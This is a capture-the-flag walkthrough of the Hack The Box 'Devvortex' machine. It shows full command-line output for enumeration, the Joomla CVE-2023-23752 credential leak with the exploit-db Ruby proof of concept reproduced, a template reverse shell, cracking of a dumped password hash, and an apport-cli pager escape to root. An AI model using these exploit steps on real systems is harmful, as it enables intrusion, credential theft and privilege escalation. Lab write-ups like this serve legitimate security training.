# Devvortex | HTB
### Difficulty Level: Easy
--------------------------------------------

*add machine ip-address to /etc/hosts file with:*
```bash
echo '<machine-ip>    devvortex.htb' >> /etc/hosts
```

First, for the enumeration part, start with host's scan with nmap:

```bash
nmap -T4 -A devvortex.htb -oN dev.nmap
```

-T4 ---> increases scan's speed.

-A ---> aggresive scan to gather more information.

-oN ---> saves the output to a file.

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 13:03 EDT
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/3%OT=22%CT=1%CU=43987%PV=Y%DS=2%DC=T%G=Y%TM=660D8
OS:C15%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CS
OS:T11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E
OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   79.92 ms 10.10.14.1
2   79.94 ms devvortex.htb (10.10.11.242)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.55 seconds
```

There are 2 open ports.

22- SSH

80- HTTP

While browsing into the webpage, there is home page:

![image](https://cdn-images-1.medium.com/max/1000/1*RX5u537CK3zKK3K2g7UFRw.png)


After web application's investigation , I discovered nothing.
so let's use gobuster to find directories or files within the system:

```bash
gobuster dir -u devvortex.htb -w /usr/share/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]                                          
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]                                             
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]                                              
Progress: 1680 / 220561 (0.76%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 1680 / 220561 (0.76%)
===============================================================
Finished
```

It's time trying discover subdomain within the system with:
```bash
gobuster dns -d devvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     devvortex.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.devvortex.htb

Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
```

There is subdomain. Add it to /etc/hosts.

navigate there:

![image](https://cdn-images-1.medium.com/max/1000/1*L1caweDd0eG6CjSdeHN75Q.png)


Nothing there.

Find directories within the system with gobuster, and now the scan will be with the subdomain:

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/home                 (Status: 200) [Size: 23221]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
```

The scan isn't over yet but there is /administrator directory, looks good to us.

browse there:

![image](https://cdn-images-1.medium.com/max/1000/1*VtvJ64hgXyBYuPw17afuRw.png)

![image](https://cdn-images-1.medium.com/max/1000/1*5aq2nbhbnnys5M_cRGIKWg.png)


There is joomla administrator login page.

joomla is a crm, and it has a tool that gives us the option the scan the crm by providing url.

use joomscan tool:

```bash

joomscan http://dev.devvortex.htb


    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable
                                                                                                                                       
[+] Checking apache info/status files                                                                                                  
[++] Readable info/status files are not found                                                                                          
                                                                                                                                       
[+] admin finder                                                                                                                       
[++] Admin page : http://dev.devvortex.htb/administrator/                                                                              
                                                                                                                                       
[+] Checking robots.txt existing                                                                                                       
[++] robots.txt is found                                                                                                               
path : http://dev.devvortex.htb/robots.txt                                                                                             
                                                                                                                                       
Interesting path found from robots.txt                                                                                                 
http://dev.devvortex.htb/joomla/administrator/                                                                                         
http://dev.devvortex.htb/administrator/                                                                                                
http://dev.devvortex.htb/api/                                                                                                          
http://dev.devvortex.htb/bin/                                                                                                          
http://dev.devvortex.htb/cache/                                                                                                        
http://dev.devvortex.htb/cli/                                                                                                          
http://dev.devvortex.htb/components/                                                                                                   
http://dev.devvortex.htb/includes/                                                                                                     
http://dev.devvortex.htb/installation/                                                                                                 
http://dev.devvortex.htb/language/                                                                                                     
http://dev.devvortex.htb/layouts/                                                                                                      
http://dev.devvortex.htb/libraries/                                                                                                    
http://dev.devvortex.htb/logs/                                                                                                         
http://dev.devvortex.htb/modules/                                                                                                      
http://dev.devvortex.htb/plugins/                                                                                                      
http://dev.devvortex.htb/tmp/                                                                                                          
                                                                                                                                       
                                                                                                                                       
[+] Finding common backup files name                                                                                                   
[++] Backup files are not found                                                                                                        
                                                                                                                                       
[+] Finding common log files name                                                                                                      
[++] error log is not found                                                                                                            
                                                                                                                                       
[+] Checking sensitive config.php.x file                                                                                               
[++] Readable config files are not found                                                                                               
                                                                                                                                       
                                                                                                                                       
Your Report : reports/dev.devvortex.htb/ 
```

A lot of information, let's focuse the version of the CRM:

https://vulncheck.com/blog/joomla-for-rce 

this version of joomla is vulnerable, there is a leakage of credentials from the database.

```bash
curl -v http://dev.devvortex.htb/api/index.php/v1/users?public=true


* Host dev.devvortex.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.242
*   Trying 10.10.11.242:80...
* Connected to dev.devvortex.htb (10.10.11.242) port 80
> GET /api/index.php/v1/users?public=true HTTP/1.1
> Host: dev.devvortex.htb
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Wed, 03 Apr 2024 17:47:36 GMT
< Content-Type: application/vnd.api+json; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< x-frame-options: SAMEORIGIN
< referrer-policy: strict-origin-when-cross-origin
< cross-origin-opener-policy: same-origin
< X-Powered-By: JoomlaAPI/1.0
< Expires: Wed, 17 Aug 2005 00:00:00 GMT
< Last-Modified: Wed, 03 Apr 2024 17:47:36 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< 
* Connection #0 to host dev.devvortex.htb left intact
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/users?public=true"},"data":[{"type":"users","id":"649","attributes":{"id":649,"name":"lewis","username":"lewis","email":"lewis@devvortex.htb","block":0,"sendEmail":1,"registerDate":"2023-09-25 16:44:24","lastvisitDate":"2023-10-29 16:18:50","lastResetTime":null,"resetCount":0,"group_count":1,"group_names":"Super Users"}},{"type":"users","id":"650","attributes":{"id":650,"name":"logan paul","username":"logan","email":"logan@devvortex.htb","block":0,"sendEmail":0,"registerDate":"2023-09-26 19:15:42","lastvisitDate":null,"lastResetTime":null,"resetCount":0,"group_count":1,"group_names":"Registered"}}],"meta":{"total-pages":1}} 
```

There are 2 username: lewis and logan.

That's not enough to us to achieve what we need, so i tried to get mor information by inspect the poc inside exploit-db.

```#!/usr/bin/env ruby

# Exploit
## Title: Joomla! v4.2.8 - Unauthenticated information disclosure
## Exploit author: noraj (Alexandre ZANNI) for ACCEIS (https://www.acceis.fr)
## Author website: https://pwn.by/noraj/
## Exploit source: https://github.com/Acceis/exploit-CVE-2023-23752
## Date: 2023-03-24
## Vendor Homepage: https://www.joomla.org/
## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz
## Version: 4.0.0 < 4.2.8 (it means from 4.0.0 up to 4.2.7)
## Tested on: Joomla! Version 4.2.7
## CVE : CVE-2023-23752
## References:
##   - https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/
##   - https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
##   - https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752
##   - https://nvd.nist.gov/vuln/detail/CVE-2023-23752
##   - https://vulncheck.com/blog/joomla-for-rce
##   - https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-23752.yaml

# standard library
require 'json'
# gems
require 'httpx'
require 'docopt'
require 'paint'

doc = <<~DOCOPT
  #{Paint['Joomla! < 4.2.8 - Unauthenticated information disclosure', :bold]}

  #{Paint['Usage:', :red]}
    #{__FILE__} <url> [options]
    #{__FILE__} -h | --help

  #{Paint['Parameters:', :red]}
    <url>       Root URL (base path) including HTTP scheme, port and root folder

  #{Paint['Options:', :red]}
    --debug     Display arguments
    --no-color  Disable colorized output (NO_COLOR environment variable is respected too)
    -h, --help  Show this screen

  #{Paint['Examples:', :red]}
    #{__FILE__} http://127.0.0.1:4242
    #{__FILE__} https://example.org/subdir

  #{Paint['Project:', :red]}
    #{Paint['author', :underline]} (https://pwn.by/noraj / https://twitter.com/noraj_rawsec)
    #{Paint['company', :underline]} (https://www.acceis.fr / https://twitter.com/acceis)
    #{Paint['source', :underline]} (https://github.com/Acceis/exploit-CVE-2023-23752)
DOCOPT

def fetch_users(root_url, http)
  vuln_url = "#{root_url}/api/index.php/v1/users?public=true"
  http.get(vuln_url)
end

def parse_users(root_url, http)
  data_json = fetch_users(root_url, http)
  data = JSON.parse(data_json)['data']
  users = []
  data.each do |user|
    if user['type'] == 'users'
      id = user['attributes']['id']
      name = user['attributes']['name']
      username = user['attributes']['username']
      email = user['attributes']['email']
      groups = user['attributes']['group_names']
      users << {id: id, name: name, username: username, email: email, groups: groups}
    end
  end
  users
end

def display_users(root_url, http)
  users = parse_users(root_url, http)
  puts Paint['Users', :red, :bold]
  users.each do |u|
    puts "[#{u[:id]}] #{u[:name]} (#{Paint[u[:username], :yellow]}) - #{u[:email]} - #{u[:groups]}"
  end
end

def fetch_config(root_url, http)
  vuln_url = "#{root_url}/api/index.php/v1/config/application?public=true"
  http.get(vuln_url)
end

def parse_config(root_url, http)
  data_json = fetch_config(root_url, http)
  data = JSON.parse(data_json)['data']
  config = {}
  data.each do |entry|
    if entry['type'] == 'application'
      key = entry['attributes'].keys.first
      config[key] = entry['attributes'][key]
    end
  end
  config
end

def display_config(root_url, http)
  c = parse_config(root_url, http)
  puts Paint['Site info', :red, :bold]
  puts "Site name: #{c['sitename']}"
  puts "Editor: #{c['editor']}"
  puts "Captcha: #{c['captcha']}"
  puts "Access: #{c['access']}"
  puts "Debug status: #{c['debug']}"
  puts
  puts Paint['Database info', :red, :bold]
  puts "DB type: #{c['dbtype']}"
  puts "DB host: #{c['host']}"
  puts "DB user: #{Paint[c['user'], :yellow, :bold]}"
  puts "DB password: #{Paint[c['password'], :yellow, :bold]}"
  puts "DB name: #{c['db']}"
  puts "DB prefix: #{c['dbprefix']}"
  puts "DB encryption #{c['dbencryption']}"
end

begin
  args = Docopt.docopt(doc)
  Paint.mode = 0 if args['--no-color']
  puts args if args['--debug']

  http = HTTPX
  display_users(args['<url>'], http)
  puts
  display_config(args['<url>'], http)
rescue Docopt::Exit => e
  puts e.message
end

```

Again, I can see the path that we curl before...and there is another path to curl to within the poc:
```
def fetch_config(root_url, http)
  vuln_url = "#{root_url}/api/index.php/v1/config/application?public=true"
  http.get(vuln_url)
end
```

```bash
└─# curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true 

* Host dev.devvortex.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.242
*   Trying 10.10.11.242:80...
* Connected to dev.devvortex.htb (10.10.11.242) port 80
> GET /api/index.php/v1/config/application?public=true HTTP/1.1
> Host: dev.devvortex.htb
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Wed, 03 Apr 2024 17:59:41 GMT
< Content-Type: application/vnd.api+json; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< x-frame-options: SAMEORIGIN
< referrer-policy: strict-origin-when-cross-origin
< cross-origin-opener-policy: same-origin
< X-Powered-By: JoomlaAPI/1.0
< Expires: Wed, 17 Aug 2005 00:00:00 GMT
< Last-Modified: Wed, 03 Apr 2024 17:59:41 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< 
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes"* Connection #0 to host dev.devvortex.htb left intact
:{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```

There are password too. I tried to connect with ssh without any success.

lewis:P4ntherg0t1n5r3c0n##

let's take these credentials and try to connect into the joomla administrator login.
and we are in.

upload reverse shell to one of the pages that are exist.


![image](https://cdn-images-1.medium.com/max/1000/1*tQIKnoKkjCSMJfik_PmGxg.png)

set netcat listener on your machine:


```bash
nc -lnvp 1234
```

after saving the file there is a shell.

```bash
└─# nc -lnvp 1234
listening on [any] 1234 ...
connect to [tun-0] from (UNKNOWN) [10.10.11.242] 41860
bash: cannot set terminal process group (856): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb$ whoami
whoami
www-data
www-data@devvortex:~/dev.devvortex.htb$
```

I tried to achieve the first flag but it's location is /home/logan and as www-data we don't have any permission.

so I decided to upload linpeas from my machine to the target-ip to find a way to become logan.

There is mysql service that runs within the system on port 3306.

as we know that lets try to get inside the db with the credentials of lewis that we got before from the db leaked information.

before that you have the stabalize the shell with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

It's important cause than you won't be able to access the database.

after you got an entry you want to get all databases names with:

```
mysql> SHOW DATABASES;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
```

There is database that is name is 'joomla':

```
mysql> USE joomla
USE joomla
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

we are inside 'joomla' db.

The next step is to get all the tables within this db:

```
mysql> SHOW TABLES;
SHOW TABLES;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)
```

There is a table that maybe has credentials: sd4fg_users.

lets watch the tables with:

```
mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-04-03 22:06:04 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

```

And there are credentials to logan and lewis. we need logan's hashed password.

create a file with the hash and crack it with john the ripper:

```bash
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:14 DONE (2024-04-03 18:21) 0.07057g/s 99.08p/s 99.08c/s 99.08C/s iceman..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

we got the password.

```bash
www-data@devvortex:~/dev.devvortex.htb$ su logan                                                                                       
su logan                                                                                                                               
Password: tequieromucho                                                                                                                
                                                                                                                                       
logan@devvortex:/var/www/dev.devvortex.htb$
```

and we are logan.

grab the user.txt flag.
```bash
logan@devvortex:/var/www/dev.devvortex.htb$ cat /home/logan/user.txt                                                                   
cat /home/logan/user.txt                                                                                                               
********************************                                                                                                       
logan@devvortex:/var/www/dev.devvortex.htb$ 
```

Let's try to escalate our privilliges with:

```bash
sudo -l
```

It checks which files logan can run with elevated permissions with sudo.

```bash
logan@devvortex:/var/www/dev.devvortex.htb$ sudo -l                                                                                    
sudo -l                                                                                                                                
[sudo] password for logan: **************                                                                                               
                                                                                                                                       
Matching Defaults entries for logan on devvortex:                                                                                      
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli

```

I cat the binary file but didn't understand what it actually does so I searched about that file on google.

I found an exploit on : https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/

use it, but the most important thing is to understand what are you doing (read about the vulnerablity).

Grab root.txt flag.


```bash
logan@devvortex:/var/www/dev.devvortex.htb$ sudo /usr/bin/apport-cli --file-bug
<.devvortex.htb$ sudo /usr/bin/apport-cli --file-bug

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 2
2^J

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What particular problem do you observe?


Choices:
  1: Removable storage device is not mounted automatically
  2: Internal hard disk partition cannot be mounted manually
  3: Internal hard disk partition is not displayed in Places menu
  4: No permission to access files on storage device
  5: Documents cannot be opened in desktop UI on storage device
  6: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/C): 4
4^J
..................................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (712.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): 
What would you like to do? Your options are:
  S: Send report (712.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
V^J
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash 
!//bbiinn//bbaasshh!/bin/bash
root@devvortex:/var/www/dev.devvortex.htb# whoami
whoami
root
root@devvortex:/var/www/dev.devvortex.htb# cat /root/root.txt
cat /root/root.txt
*******************************
```

THIS IS THE END!

***Written by Alon Presman, Penetration Tester and Ethical Hacker.***





























































